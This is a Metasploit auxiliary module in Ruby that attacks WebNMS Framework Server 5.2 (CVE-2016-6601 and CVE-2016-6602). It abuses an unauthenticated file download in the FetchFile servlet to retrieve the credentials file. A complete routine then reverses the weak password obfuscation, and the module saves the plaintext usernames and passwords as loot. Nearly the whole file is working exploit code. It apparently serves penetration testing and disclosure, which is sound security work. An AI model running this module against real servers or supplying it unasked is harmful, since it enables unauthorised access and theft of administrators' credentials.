##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WebNMS Framework Server Credential Disclosure',
        'Description' => %q(
This module abuses two vulnerabilities in WebNMS Framework Server 5.2 to extract
all user credentials. The first vulnerability is an unauthenticated file download
in the FetchFile servlet, which is used to download the file containing the user
credentials. The second vulnerability is that the passwords in the file are
obfuscated with a very weak algorithm which can be easily reversed.
This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on
Windows and Linux.
),
        'Author' =>
          [
            'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
          ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            [ 'CVE', '2016-6601'],
            [ 'CVE', '2016-6602'],
            [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ],
            [ 'URL', 'https://seclists.org/fulldisclosure/2016/Aug/54' ]
          ],
        'DisclosureDate' => 'Jul 4 2016'
      )
    )

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 9090]),
        OptString.new('TARGETURI', [true, "WebNMS path", '/'])
      ],
      self.class
    )
  end

  def version_check
    begin
      res = send_request_cgi(
        'uri'      => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
        'method'   => 'GET',
        'vars_get' => { 'fileName' => 'help/index.html' }
      )
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable, Errno::ECONNRESET => e
      vprint_error("Failed to get Version: #{e.class} - #{e.message}")
      return
    end
    if res && res.code == 200 && !res.body.empty?
      title_string = res.get_html_document.at('title').to_s
      version = title_string.match(/[0-9]+.[0-9]+/)
      vprint_status("Version Detected = #{version}")
    end
  end

  def run
    # version check will not stop the module, but it will try to
    # determine the version and print it if verbose is set to true
    version_check
    begin
      res = send_request_cgi(
        'uri'      => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
        'method'   => 'GET',
        'vars_get' => { 'fileName' => 'conf/securitydbData.xml' }
      )
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable, Errno::ECONNRESET => e
      print_error("Module Failed: #{e.class} - #{e.message}")
    end

    if res && res.code == 200 && !res.body.empty?
      cred_table = Rex::Text::Table.new(
        'Header'  => 'WebNMS Login Credentials',
        'Indent'  => 1,
        'Columns' =>
          [
            'Username',
            'Password'
          ]
      )
      print_status "#{peer} - Got securitydbData.xml, attempting to extract credentials..."
      res.body.to_s.each_line { |line|
        # we need these checks because username and password might appear in any random position in the line
        if line.include? "username="
          username = line.match(/username="([\w]*)"/)[1]
        end
        if line.include? "password="
          password = line.match(/password="([\w]*)"/)[1]
        end
        if password && username
          plaintext_password = super_redacted_deobfuscation(password)
          cred_table << [ username, plaintext_password ]
          connection_details = {
              module_fullname: self.fullname,
              username: username,
              private_data: plaintext_password,
              private_type: :password,
              status: Metasploit::Model::Login::Status::UNTRIED
          }.merge(service_details)
          create_credential_and_login(connection_details)
        end
      }

      print_line
      print_line(cred_table.to_s)
      loot_name     = 'webnms.creds'
      loot_type     = 'text/csv'
      loot_filename = 'webnms_login_credentials.csv'
      loot_desc     = 'WebNMS Login Credentials'
      p = store_loot(
        loot_name,
        loot_type,
        rhost,
        cred_table.to_csv,
        loot_filename,
        loot_desc
      )
      print_status "Credentials saved in: #{p}"
      return
    end
  end

  # Returns the plaintext of a string obfuscated with WebNMS's super redacted obfuscation algorithm.
  # I'm sure this can be simplified, but I've spent far too many hours implementing to waste any more time!
  def super_redacted_deobfuscation(ciphertext)
    input = ciphertext
    input = input.gsub("Z", "000")

    base = '0'.upto('9').to_a + 'a'.upto('z').to_a + 'A'.upto('G').to_a
    base.push 'I'
    base += 'J'.upto('Y').to_a

    answer = ''
    k = 0
    remainder = 0
    co = input.length / 6

    while k < co
      part = input[(6 * k), 6]
      partnum = ''
      startnum = false

      for i in 0...5
        isthere = false
        pos = 0
        until isthere
          if part[i] == base[pos]
            isthere = true
            partnum += pos.to_s
            if pos == 0
              if !startnum
                answer += "0"
              end
            else
              startnum = true
            end
          end
          pos += 1
        end
      end

      isthere = false
      pos = 0
      until isthere
        if part[5] == base[pos]
          isthere = true
          remainder = pos
        end
        pos += 1
      end

      if partnum.to_s == "00000"
        if remainder != 0
          tempo = remainder.to_s
          temp1 = answer[0..(tempo.length)]
          answer = temp1 + tempo
        end
      else
        answer += (partnum.to_i * 60 + remainder).to_s
      end
      k += 1
    end

    if input.length % 6 != 0
      ending = input[(6 * k)..(input.length)]
      partnum = ''
      if ending.length > 1
        i = 0
        startnum = false
        for i in 0..(ending.length - 2)
          isthere = false
          pos = 0
          until isthere
            if ending[i] == base[pos]
              isthere = true
              partnum += pos.to_s
              if pos == 0
                if !startnum
                  answer += "0"
                end
              else
                startnum = true
              end
            end
            pos += 1
          end
        end

        isthere = false
        pos = 0
        until isthere
          if ending[i + 1] == base[pos]
            isthere = true
            remainder = pos
          end
          pos += 1
        end
        answer += (partnum.to_i * 60 + remainder).to_s
      else
        isthere = false
        pos = 0
        until isthere
          if ending == base[pos]
            isthere = true
            remainder = pos
          end
          pos += 1
        end
        answer += remainder.to_s
      end
    end

    final = ''
    for k in 0..((answer.length / 2) - 1)
      final.insert(0, (answer[2 * k, 2].to_i + 28).chr)
    end
    final
  end

  def service_details
    super.merge({service_name: 'WebNMS-' + (ssl ? 'HTTPS' : 'HTTP')}) # this should possibly be removed
  end
end
